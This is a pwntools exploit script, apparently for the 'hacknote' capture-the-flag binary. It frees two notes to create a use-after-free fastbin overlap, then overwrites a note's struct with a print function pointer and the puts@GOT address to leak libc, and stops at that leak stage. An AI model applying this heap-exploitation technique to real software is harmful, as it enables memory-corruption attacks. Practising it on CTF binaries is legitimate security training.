#!/usr/bin/env python3
from pwn import *

# Set up the binary and process
elf = ELF('./hacknote_patched')
# libc = ELF("libc.so.6") 
p = process('./hacknote_patched')
#p = gdb.debug('./hacknote_patched')

# --- Helper Functions ---
def add_note(size, content):
    p.sendlineafter(b"choice :", b"1")          # Wait for menu prompt
    p.sendlineafter(b"Note size :", str(size).encode()) # Wait for size prompt
    p.sendafter(b"Content :", content)          # Use sendafter to avoid appending an extra newline to your payload

def delete_note(idx):
    p.sendlineafter(b"choice :", b"2")
    p.sendlineafter(b"Index :", str(idx).encode())

def print_note(idx):
    p.sendlineafter(b"choice :", b"3")
    p.sendlineafter(b"Index :", str(idx).encode())

# --- Exploit Execution ---

# 1. Allocate Note 0 and Note 1
add_note(16, b"AAAA")
add_note(16, b"BBBB")

# 2. Free Note 0 and Note 1 to set up the UAF Fastbin overlap
delete_note(0)
delete_note(1)

# 3. Construct the Leak Payload
# NOTE: Your original script used 0x0804862b twice. 
# The second value needs to be puts@GOT to execute the leak!
print_func = 0x0804862b
puts_got = 0x0804a024 

payload = p32(print_func) + p32(puts_got)

# 4. Allocate Note 2 to overwrite Note 0's struct
add_note(8, payload)

# 5. Trigger the leak
print_note(0)

# Receive the 4 bytes of raw leaked address
#leaked_puts = u32(p.recv(4))
#log.success(f"Leaked puts@GLIBC: {hex(leaked_puts)}")

p.interactive()
